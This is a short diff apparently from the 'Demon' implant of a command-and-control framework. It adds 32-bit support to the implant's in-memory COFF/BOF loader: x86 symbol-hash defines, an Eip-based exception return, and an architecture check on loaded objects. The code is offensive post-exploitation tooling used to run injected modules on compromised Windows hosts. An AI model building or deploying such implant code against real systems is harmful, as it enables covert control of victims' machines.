@@ -20,6 +20,13 @@
     // __imp_Beacon
     #define COFF_PREP_BEACON        0xd0a409b0
     #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
+#else
+    // __imp_
+    #define COFF_PREP_SYMBOL        0xec6ba2a8
+    #define COFF_PREP_SYMBOL_SIZE   6
+    // __imp_Beacon
+    #define COFF_PREP_BEACON        0xd0a409b0
+    #define COFF_PREP_BEACON_SIZE   ( COFF_PREP_SYMBOL_SIZE + 6 )
 #endif
 
 PVOID CoffeeFunctionReturn = NULL;
@@ -29,7 +36,11 @@ LONG WINAPI VehDebugger( PEXCEPTION_POINTERS Exception )
     PRINTF( "Exception: %p\n", Exception->ExceptionRecord->ExceptionCode )
 
     // Leave faulty function
+#if _WIN64
     Exception->ContextRecord->Rip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
+#else
+    Exception->ContextRecord->Eip = (DWORD64)(ULONG_PTR)CoffeeFunctionReturn;
+#endif
 
     PPACKAGE Package = PackageCreate( DEMON_COMMAND_INLINE_EXECUTE );
     PackageAddInt32( Package, DEMON_COMMAND_INLINE_EXECUTE_EXCEPTION );
@@ -599,11 +610,23 @@ VOID CoffeeLdr( PCHAR EntryName, PVOID CoffeeData, PVOID ArgData, SIZE_T ArgSize
     Coffee->Next      = Instance.Coffees;
     Instance.Coffees  = Coffee;
 
+#if _WIN64
+
     if ( Coffee->Header->Machine != IMAGE_FILE_MACHINE_AMD64 )
     {
         PUTS( "The BOF is not AMD64" );
         goto END;
     }
+
+#else
+
+    if ( Coffee->Header->Machine == IMAGE_FILE_MACHINE_AMD64 )
+    {
+        PUTS( "The BOF is AMD64" );
+        goto END;
+    }
+
+#endif
 
     Coffee->SecMap     = Instance.Win32.LocalAlloc( LPTR, Coffee->Header->NumberOfSections * sizeof( SECTION_MAP ) );
     Coffee->FunMapSize = CoffeeGetFunMapSize( Coffee );
